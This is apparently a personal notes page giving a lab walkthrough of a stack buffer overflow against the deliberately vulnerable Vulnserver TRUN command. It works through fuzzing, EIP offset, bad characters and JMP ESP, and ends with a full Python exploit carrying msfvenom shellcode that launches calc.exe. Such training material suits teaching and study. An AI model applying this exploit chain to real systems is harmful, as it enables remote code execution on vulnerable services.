class=dd-item><a href=/tools/00-steganography/><i class="fas fa-folder"></i>Steganography</a><ul><li data-nav-id=/tools/00-steganography/binwalk/ title=binwalk class=dd-item><a href=/tools/00-steganography/binwalk/><i class="fas fa-wrench"></i>binwalk</a></li><li data-nav-id=/tools/00-steganography/foremost/ title=foremost class=dd-item><a href=/tools/00-steganography/foremost/><i class="fas fa-wrench"></i>foremost</a></li><li data-nav-id=/tools/00-steganography/steghide/ title=steghide class=dd-item><a href=/tools/00-steganography/steghide/><i class="fas fa-wrench"></i>steghide</a></li></ul></li><li data-nav-id=/tools/amass/ title=amass class=dd-item><a href=/tools/amass/><i class="fas fa-wrench"></i>amass</a></li><li data-nav-id=/tools/h8mail/ title=h8mail class=dd-item><a href=/tools/h8mail/><i class="fas fa-wrench"></i>h8mail</a></li><li data-nav-id=/tools/nc/ title=nc class=dd-item><a href=/tools/nc/><i class="fas fa-wrench"></i>nc</a></li><li data-nav-id=/tools/nmap/ title=Nmap class=dd-item><a href=/tools/nmap/><i class="fas fa-wrench"></i>Nmap</a></li><li data-nav-id=/tools/openssl/ title=openssl class=dd-item><a href=/tools/openssl/><i class="fas fa-wrench"></i>openssl</a><ul><li data-nav-id=/tools/openssl/s_client/ title=s_client class=dd-item><a href=/tools/openssl/s_client/><i class="fas fa-wrench"></i>s_client</a></li></ul></li><li data-nav-id=/tools/psdnsdumpsterapi/ title=PSDNSDumpsterAPI class=dd-item><a href=/tools/psdnsdumpsterapi/><i class="fas fa-wrench"></i>PSDNSDumpsterAPI</a></li><li data-nav-id=/tools/sublist3r/ title=sublist3r class=dd-item><a href=/tools/sublist3r/><i class="fas fa-wrench"></i>sublist3r</a></li><li data-nav-id=/tools/theharvester/ title=theHarvester class=dd-item><a href=/tools/theharvester/><i class="fas fa-wrench"></i>theHarvester</a></li><li data-nav-id=/tools/whatweb/ title=whatweb class=dd-item><a href=/tools/whatweb/><i class="fas fa-wrench"></i>whatweb</a></li></ul></li></ul><section id=shortcuts><h3>More</h3><ul><li><a class=padding href=https://github.com/justin-p/><i class="fab fa-github"></i>Github</a></li><li><a class=padding href=https://justin-p.me/><i class="fas fa-kiss-wink-heart"></i>Blog</a></li><li><a class=padding href=https://twitter.com/JustinPerdok><i class="fab fa-twitter"></i>Twitter</a></li><li><a class=padding href=https://www.linkedin.com/in/justinperdok/><i class="fab fa-linkedin-in"></i>LinkedIn</a></li></ul></section><section id=footer><p>Built with
<a href=https://github.com/matcornic/hugo-theme-learn>Hugo Learn</a>
and
<a href=https://gohugo.io/>Hugo</a></p></section></div></nav><section id=body><div id=overlay></div><div class="padding highlightable"><div><div id=top-bar><div id=breadcrumbs itemscope itemtype=http://data-vocabulary.org/Breadcrumb><span id=sidebar-toggle-span><a href=# id=sidebar-toggle data-sidebar-toggle><i class="fas fa-bars"></i></a></span><span id=toc-menu><i class="fas fa-list-alt"></i></span><span class=links><a href=/></a>> <a href=/notes/>Notes</a> > <a href=/notes/exploit-development/>Exploit Development</a> > Buffer Overflow</span></div><div class=progress><div class=wrapper><nav id=TableOfContents><ul><li><a href=#buffer-overflow>Buffer Overflow</a><ul><li><a href=#steps>Steps</a></li><li><a href=#definitions>Definitions</a></li><li><a href=#skeleton-python-script>Skeleton Python Script</a></li><li><a href=#crash-the-application>Crash The Application</a></li><li><a href=#find-eip-offset>Find EIP Offset</a></li><li><a href=#finding-bad-characters>Finding Bad Characters</a></li><li><a href=#find-jmp-esp>Find JMP ESP</a></li><li><a href=#generate-shellcode>Generate Shellcode</a></li><li><a href=#exploit>Exploit</a></li><li><a href=#also-see>Also see</a></li></ul></li></ul></nav></div></div></div></div><div id=head-tags><div class=tags><a class=tag-link href=/tags/exploit-development>Exploit Development</a></div></div><div id=body-inner><h2 id=buffer-overflow>Buffer Overflow</h2><h3 id=steps>Steps</h3><ol><li>Crash The Application<ol><li>Spiking</li><li>Fuzzing</li></ol></li><li>Find EIP Offset</li><li>Control ESP</li><li>Identify Bad Characters</li><li>Find JMP ESP</li><li>Generate Shell Code</li><li>Exploit</li></ol><h3 id=definitions>Definitions</h3><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>EIP</td><td>The Extended Instruction Pointer (EIP) is a register that contains the address of the next instruction for the program or command.</td></tr><tr><td>ESP</td><td>The Extended Stack Pointer (ESP) is a register that lets you know where on the stack you are and allows you to push data in and out of the application.</td></tr><tr><td>JMP</td><td>The Jump (JMP) is a register that performs an unconditional jump to transfer the flow of execution by changing the EIP register.</td></tr><tr><td>\x41, \x42 \x43</td><td>The hexadecimal values for A, B and C.</td></tr></tbody></table><h3 id=skeleton-python-script>Skeleton Python Script</h3><p>The easiest way to stay organized when writing these scripts is to use a skeleton file. The below is the going to be your working grounds for the rest of these exercises. I recommend that after each step has been completed, you create a copy of the script and name it at the step you completed. This way, if you get stuck, you can go back to a working step.</p><pre><code class=language-python>#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

#offset  = ?

buff    = b&quot;&quot;  # empty byte var

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b&quot;%s&quot; % buff)
except RuntimeError as Err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()
</code></pre><h3 id=crash-the-application>Crash The Application</h3><h4 id=spikinghttpsgithubcomguilhermeferreiraspikepptreemasterspike><a href=https://github.com/guilhermeferreira/spikepp/tree/master/SPIKE>Spiking</a></h4><p>With SPIKE we can try to overflow each possible command.</p><p>Lets first look at what the program can do.</p><pre><code class=language-bash>root@kali:~# nc 192.168.136.130 9999
Welcome to Vulnerable Server! Enter HELP for help.
HELP
Valid Commands:
HELP
STATS [stat_value]
RTIME [rtime_value]
LTIME [ltime_value]
SRUN [srun_value]
TRUN [trun_value]
GMON [gmon_value]
GDOG [gdog_value]
KSTET [kstet_value]
GTER [gter_value]
HTER [hter_value]
LTER [lter_value]
KSTAN [lstan_value]
EXIT
EXT
GOODBYE
</code></pre><p>Basic commands of SPIKE:</p><pre><code class=language-bash>s_string(argument); // Sends the argument without modification to he application
s_string_variable(“random”); // Sends an array of random data to he application
s_readline(); // Reads one line from the response
</code></pre><p>So lets start testing the Commands</p><p>Lets create .spk files for each command</p><p>Example for STATS</p><pre><code class=language-bash>s_readline();
s_string(&quot;STATS &quot;);
s_string_variable(&quot;b0b&quot;);
</code></pre><p>Then we run a script called &lsquo;generic_send_tcp&rsquo; from the SPIKE framework that will test this command for us.</p><p><code>generic_send_tcp 192.168.138.130 9999 STATS.spk 0 0</code></p><p><img src=images/BO_spike.png alt="Spiking the application"></p><p><img src=images/BO_spike_2.png alt="Debugger while spiking"></p><p><img src=images/BO_wireshark.gif alt="Wireshark while spiking"></p><p>After this is finished running we can look at our debugger. If the program crashed teh debugger will be in a paused state.<br>In this case it looks like STATS is not vulnerable.</p><p><img src=images/BO_nocrasch.png alt="No overflow"></p><p>After testing the following commands are vulnerable</p><h5 id=trun>TRUN</h5><p><img src=images/BO_trunoverflow.png alt="TRUN overflow"></p><h5 id=gmon>GMON</h5><p><img src=images/BO_gmonoverflow.png alt="GMON overflow"></p><h5 id=kstet>KSTET</h5><p><img src=images/BO_kstetoverflow.png alt="KSTET overflow"></p><h5 id=gter>GTER</h5><p><img src=images/BO_GTER_overflow.png alt="GTER overflow"></p><h5 id=hter>HTER</h5><p><img src=images/BO_HTERoverflow.png alt="HTER overflow"></p><h5 id=lter>LTER</h5><p><img src=images/BO_LTER_overflow.png alt="LTER overflow"></p><h4 id=fuzzing>Fuzzing</h4><p>Now that we know some params are vulnerable to overflows we can start to fuzz and find out where they break. For now we will focus on TRUN.<br>Fuzzing is sending over &lsquo;junk&rsquo; data in increments, in this example increments of 100 bytes, to find the general point where the program breaks.</p><p>This can be done with some python code.</p><pre><code class=language-python>#!/usr/bin/python

import socket,sys
from time import sleep

address = '192.168.136.130'
port    = 9999

offset  = 100

while True:
    try:
        buffer  = b&quot;&quot;         # empty byte var
        buffer += b&quot;A&quot;*offset # junk times offset
        print(f'[+] Sending buffer: {str(len(buffer))} bytes')
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((address,port))
        s.recv(1024)
        s.send(b&quot;TRUN /.:/%s \r\n&quot; % buffer)
        offset += 100
        sleep(1)
    except RuntimeError as Err:
        print(f'[!] Unable to connect to the application. {err}')
        sys.exit(0)
    finally:
        s.close()
</code></pre><p>When we run this python script it will run until we send over a buffer large enough where it breaks. In this case the program crashed at a buffer of 2109 bytes (<code>TRUN /.:/ + 'A'*2100</code>).</p><pre><code class=language-bash>root@kali:/mnt/hgfs/_shared_folder/BO python3 trun_1.py
[+] Sending buffer: 109 bytes
[+] Sending buffer: 209 bytes
[+] Sending buffer: 309 bytes
[+] Sending buffer: 409 bytes
[+] Sending buffer: 509 bytes
[+] Sending buffer: 609 bytes
[+] Sending buffer: 709 bytes
[+] Sending buffer: 809 bytes
[+] Sending buffer: 909 bytes
[+] Sending buffer: 1009 bytes
[+] Sending buffer: 1109 bytes
[+] Sending buffer: 1209 bytes
[+] Sending buffer: 1309 bytes
[+] Sending buffer: 1409 bytes
[+] Sending buffer: 1509 bytes
[+] Sending buffer: 1609 bytes
[+] Sending buffer: 1709 bytes
[+] Sending buffer: 1809 bytes
[+] Sending buffer: 1909 bytes
[+] Sending buffer: 2009 bytes
[+] Sending buffer: 2109 bytes
[!] Unable to connect to the application.
</code></pre><p><img src=images/BO_TRUN_crash_at_2100.png alt="TRUN Crash"></p><h3 id=find-eip-offset>Find EIP Offset</h3><p>Now that we know the application crashes at around 2100 bytes we should try to pinpoint the offset of the EIP register.<br>We want todo this since the EIP contains the address of the next instruction, meaning if we control the EIP we can control what the program does next.</p><p>To find the offset we can use a pattern, one we can use <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb</code></p><pre><code class=language-bash>root@kali:/mnt/hgfs/_shared_folder/BO# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2200
</code></pre><pre><code class=language-python>#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

#offset  = around 2100

pattern = b&quot;Aa0Aa1Aa....7Cu8Cu9Cv0Cv1Cv2C&quot;  # output of pattern_create.rb
buff    = b&quot;&quot;              # empty byte var
buff    = b&quot;%s&quot; % pattern  # add pattern to buff

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b&quot;TRUN /.:/%s&quot; % buff)
except RuntimeError as Err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()

</code></pre><p><img src=images/BO_offset_1.png alt="Offest 1"></p><p>EIP value: 386f4337 (8oC7)</p><p>To find the offset we can use /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb</p><pre><code class=language-bash>root@kali:/mnt/hgfs/_shared_folder/BO /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2200 -q 386f4337
[*] Exact match at offset 2003
</code></pre><h4 id=controlling-the-esp>Controlling the ESP</h4><p>Now that we know that the offset to the EIP is 2003 bytes, we need to fill the stack with that many bytes. So if we send over 2003 bytes of junk data we end up at byte 2004. This should be the start of the EIP.</p><p>To verify that this is indeed the EIP we will fill byte 2004,2005,2006,2007 with B&rsquo;s. This should result in the EIP containing 4 B&rsquo;s (42424242 in hex).</p><p>We also add some extra junk to get an idea of how much space we have on the stack.</p><pre><code class=language-python>#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

buff  = b&quot;&quot;         # empty byte var
buff += b'A'*offset # junk
buff += b'B'*4      # EIP
buff += b'C'*256    # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256    # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128    #
buff += b'F'*128    #
buff += b'G'*64     #
buff += b'H'*64     #
buff += b'I'*32     #
buff += b'J'*32     #

print(buff)

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b&quot;TRUN /.:/%s&quot; % buff)
except RuntimeError as err:
    print(f'[!] Unable to connect to the application.')
    sys.exit(0)
finally:
    s.close()
</code></pre><p><img src=images/BO_EIP_424242.png alt="Overwritten EIP 1"></p><p>Success !</p><p><img src=images/BO_overwritten_EIP.png alt="Overwritten EIP 2"></p><p>here we can see we have at least 960 bytes of space left on the stack to store our shellcode.</p><p><img src=images/BO_extra_space_on_stack.png alt="Extra space on stack"></p><h3 id=finding-bad-characters>Finding Bad Characters</h3><p>So now that we control the EIP we want to get our shellcode where the C&rsquo;s are right ? Well no, not yet.</p><p>First we need to do some &lsquo;house cleaning&rsquo; and remove bad characters.</p><p>Bad characters is simply a list of unwanted characters that can would break the shellcode. There is no universal set of bad characters, this depends on the application and the developer logic. That means we have to find the bad characters in vulnserver before writing shellcode.</p><p>Some of the common bad characters are:</p><table><thead><tr><th>HEX</th><th>explanation</th><th>ascii</th></tr></thead><tbody><tr><td>00</td><td>NULL</td><td></td></tr><tr><td>0A</td><td>Line Feed</td><td>\n</td></tr><tr><td>0D</td><td>Carriage Return</td><td>\r</td></tr><tr><td>FF</td><td>Form Feed</td><td>\f</td></tr></tbody></table><p>To test for Bad Characters we simply trow every possible character in hex format at the application and see if any of act up.</p><pre><code class=language-python>#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

command = b'TRUN /.:/'
offset  = 2003

bad_chars = [0x00]
chars = b&quot;&quot;
for i in range(0x00,0xFF+1):
    if i not in bad_chars:
        chars += bytes([i])

buff  = b&quot;&quot;         # empty byte var
buff += b&quot;A&quot;*offset # junk
buff += b&quot;B&quot;*4      # EIP
buff += b&quot;&quot; + chars # test for chars

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b&quot;TRUN /.:/%s&quot; % buff)
except RuntimeError as err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()
</code></pre><p>Now right click on the ESP and show hexdump</p><p><img src=images/BO_show_hexdump.png alt="Follow in Dump"></p><p>Here we see all the chars. Now we simply count up from 01 to FF. If any are missing this is a &lsquo;bad character&rsquo; and we should exclude it when generating shellcode.</p><p><img src=images/BO_memdump.png alt="Memory Dump"></p><h3 id=find-jmp-esp>Find JMP ESP</h3><p>Now that we know the offset of the EIP, know what characters we can use for our shellcode and saw we have plenty of space on the stack we can start locking for a JMP ESP.</p><p>We do that since if we find a adresspace in memory where a JMP ESP currently lives and point the EIP at that adresspace we are telling the program to execute what we currently have stored on the stack (i.e. our shellcode).</p><p>To find a JMP ESP we can start looking for a DLL that has no protection mechanisms. We can do this with a plugin called mona.</p><p><code>!mona modules</code></p><p>Here we found a DLL that has no protections enabled.</p><p><img src=images/BO_mona_modules.png alt="Mona modules"></p><p>Now we can look if this DLL has a JMP ESP. To search for this we need to know the OPCODE equivalent of a JMP ESP.</p><p>If we don&rsquo;t know this we can use a tool called nasm_shell</p><pre><code class=language-bash>root@kali:~# /usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
nasm &gt; JMP ESP
00000000  FFE4              jmp esp
nasm &gt;
</code></pre><p><code>!mona find -s "\xFF\xE4" -m essfunc.dll</code></p><p><img src=images/BO_find_jmp_esp.png alt="Find JMP ESP"></p><p><code>625011af</code> is the address of a jump point. We want to add this value to our python script in place of the B&rsquo;s.</p><p>But since where on a x86 system it uses Little Endian Format. This means that the lowest byte is stored at the lowest addres and the highest order byte at the highest.</p><p>So it will look something like this.</p><pre><code class=language-python>#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b&quot;C&quot;*256

buff  = b&quot;&quot;                 # empty byte var
buff += b&quot;A&quot;*offset         # junk
buff += b&quot;\xAF\x11\x50\x62&quot; # EIP to JMP ESP
buff += b'C'*256            # some more junk on stack after EIP which we want to eventually store our shellcode and jump to.
buff += b'D'*256            # this also gives us an idea of how much space we have on the stack.
buff += b'E'*128            #
buff += b'F'*128            #
buff += b'G'*64             #
buff += b'H'*64             #
buff += b'I'*32             #
buff += b'J'*32             #

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b&quot;TRUN /.:/%s&quot; % buff)
except RuntimeError as err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()
</code></pre><p>Now to verify if everything is in place we can add a breakpoint at the JMP ESP address.</p><p>Search for the address space</p><p><img src=images/BO_find_address.png alt="Find Address"></p><p>Press F2 to add a breakpoint</p><p><img src=images/BO_breakpoint.png alt=Breakpoint></p><p>Now if we run our python script we can verify that EIP is pointing at the JMP ESP</p><p><img src=images/BO_stoped_on_JMP_ESP.png alt="Stoped on JMP ESP"></p><h3 id=generate-shellcode>Generate Shellcode</h3><p>Now that everything is in place we can generate our shellcode. We can do this with MSFvenom.</p><p>The command below will generate shellcode that will start the windows calculator.</p><pre><code class=language-bash>root@kali:/mnt/hgfs/_shared_folder/BO# msfvenom -p windows/exec CMD=calc.exe -b '\x00\' -f c
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 220 (iteration=0)
x86/shikata_ga_nai chosen with final size 220
Payload size: 220 bytes
Final size of c file: 949 bytes
unsigned char buf[] =
&quot;\xbb\xbb\x2a\xfd\xc1\xdb\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1&quot;
&quot;\x31\x83\xed\xfc\x31\x5d\x0f\x03\x5d\xb4\xc8\x08\x3d\x22\x8e&quot;
&quot;\xf3\xbe\xb2\xef\x7a\x5b\x83\x2f\x18\x2f\xb3\x9f\x6a\x7d\x3f&quot;
&quot;\x6b\x3e\x96\xb4\x19\x97\x99\x7d\x97\xc1\x94\x7e\x84\x32\xb6&quot;
&quot;\xfc\xd7\x66\x18\x3d\x18\x7b\x59\x7a\x45\x76\x0b\xd3\x01\x25&quot;
&quot;\xbc\x50\x5f\xf6\x37\x2a\x71\x7e\xab\xfa\x70\xaf\x7a\x71\x2b&quot;
&quot;\x6f\x7c\x56\x47\x26\x66\xbb\x62\xf0\x1d\x0f\x18\x03\xf4\x5e&quot;
&quot;\xe1\xa8\x39\x6f\x10\xb0\x7e\x57\xcb\xc7\x76\xa4\x76\xd0\x4c&quot;
&quot;\xd7\xac\x55\x57\x7f\x26\xcd\xb3\x7e\xeb\x88\x30\x8c\x40\xde&quot;
&quot;\x1f\x90\x57\x33\x14\xac\xdc\xb2\xfb\x25\xa6\x90\xdf\x6e\x7c&quot;
&quot;\xb8\x46\xca\xd3\xc5\x99\xb5\x8c\x63\xd1\x5b\xd8\x19\xb8\x31&quot;
&quot;\x1f\xaf\xc6\x77\x1f\xaf\xc8\x27\x48\x9e\x43\xa8\x0f\x1f\x86&quot;
&quot;\x8d\xe0\x55\x8b\xa7\x68\x30\x59\xfa\xf4\xc3\xb7\x38\x01\x40&quot;
&quot;\x32\xc0\xf6\x58\x37\xc5\xb3\xde\xab\xb7\xac\x8a\xcb\x64\xcc&quot;
&quot;\x9e\xaf\xeb\x5e\x42\x1e\x8e\xe6\xe1\x5e&quot;;
</code></pre><p>We can now add this shellcode to our python script.</p><p>We are also going to add something else, a NOP sled.</p><p>A NOP (No-OPeration) is a instruction that does nothing. It simply tells the CPU to skip this instruction and go to the next. When adding a bunch NOPs we create something called a NOP sled. We do this since we cant be certain where in memory we will jump to, so by adding these NOPs the CPU will just glide down the NOPs to our shellcode.</p><pre><code class=language-python>#!/usr/bin/python

import socket,sys

address = '192.168.136.130'
port    = 9999

offset  = 2003

shellcode = b&quot;\xbb\xbb\x2a\xfd\xc1\xdb\xd4\xd9\x74\x24\xf4\x5d\x33\xc9\xb1\x31\x83\xed\xfc\x31\x5d\x0f\x03\x5d\xb4\xc8\x08\x3d\x22\x8e\xf3\xbe\xb2\xef\x7a\x5b\x83\x2f\x18\x2f\xb3\x9f\x6a\x7d\x3f\x6b\x3e\x96\xb4\x19\x97\x99\x7d\x97\xc1\x94\x7e\x84\x32\xb6\xfc\xd7\x66\x18\x3d\x18\x7b\x59\x7a\x45\x76\x0b\xd3\x01\x25\xbc\x50\x5f\xf6\x37\x2a\x71\x7e\xab\xfa\x70\xaf\x7a\x71\x2b\x6f\x7c\x56\x47\x26\x66\xbb\x62\xf0\x1d\x0f\x18\x03\xf4\x5e\xe1\xa8\x39\x6f\x10\xb0\x7e\x57\xcb\xc7\x76\xa4\x76\xd0\x4c\xd7\xac\x55\x57\x7f\x26\xcd\xb3\x7e\xeb\x88\x30\x8c\x40\xde\x1f\x90\x57\x33\x14\xac\xdc\xb2\xfb\x25\xa6\x90\xdf\x6e\x7c\xb8\x46\xca\xd3\xc5\x99\xb5\x8c\x63\xd1\x5b\xd8\x19\xb8\x31\x1f\xaf\xc6\x77\x1f\xaf\xc8\x27\x48\x9e\x43\xa8\x0f\x1f\x86\x8d\xe0\x55\x8b\xa7\x68\x30\x59\xfa\xf4\xc3\xb7\x38\x01\x40\x32\xc0\xf6\x58\x37\xc5\xb3\xde\xab\xb7\xac\x8a\xcb\x64\xcc\x9e\xaf\xeb\x5e\x42\x1e\x8e\xe6\xe1\x5e&quot;

buff  = b&quot;&quot;                 # empty byte var
buff += b&quot;A&quot;*offset         # junk
buff += b&quot;\xAF\x11\x50\x62&quot; # EIP to JMP ESP
buff += b&quot;\x90&quot;*32          # NOP sled
buff += b&quot;%s&quot; % shellcode   # add shellcode to buffer

try:
    print(f'[+] Sending buffer: {str(len(buff))} bytes')
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((address,port))
    s.recv(1024)
    s.send(b&quot;TRUN /.:/%s&quot; % buff)
except RuntimeError as err:
    print(f'[!] Unable to connect to the application. {err}')
    sys.exit(0)
finally:
    s.close()
</code></pre><h3 id=exploit>Exploit</h3><p>Now just run the script and if everything goes correctly we should be greeted by a friendly calculator.</p><p><img src=images/BO_popped.png alt=popped></p><h3 id=also-see>Also see</h3><ul><li><a href=https://github.com/gh0x0st/Buffer_Overflow>Gh0x0st/Buffer_Overflow</a></li><li><a href=https://bufferoverflows.net/exploiting-vanilla-buffer-overflow-in-vulnserver-trun-command/>bufferoverflows.net</a></li><li><a href=https://github.com/stephenbradshaw/vulnserver>Vulnserver</a></li></ul><footer class=footline></footer></div></div><div id=navigation></div></section><div style=left:-1000px;overflow:scroll;position:absolute;top:-1000px;border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px><div style=border:none;box-sizing:content-box;height:200px;margin:0;padding:0;width:200px></div></div><script src=/js/clipboard.min.js></script><script src=/js/perfect-scrollbar.min.js></script><script src=/js/perfect-scrollbar.jquery.min.js></script><script src=/js/jquery.sticky.js></script><script src=/js/featherlight.min.js></script><script src=/js/highlight.pack.js></script><script>hljs.initHighlightingOnLoad();</script><script src=/js/modernizr.custom-3.6.0.js></script><script src=/js/learn.js></script><script src=/js/hugo-learn.js></script><link href=/mermaid/mermaid.css rel=stylesheet><script src=/mermaid/mermaid.js></script><script>mermaid.initialize({startOnLoad:true});</script></body></html>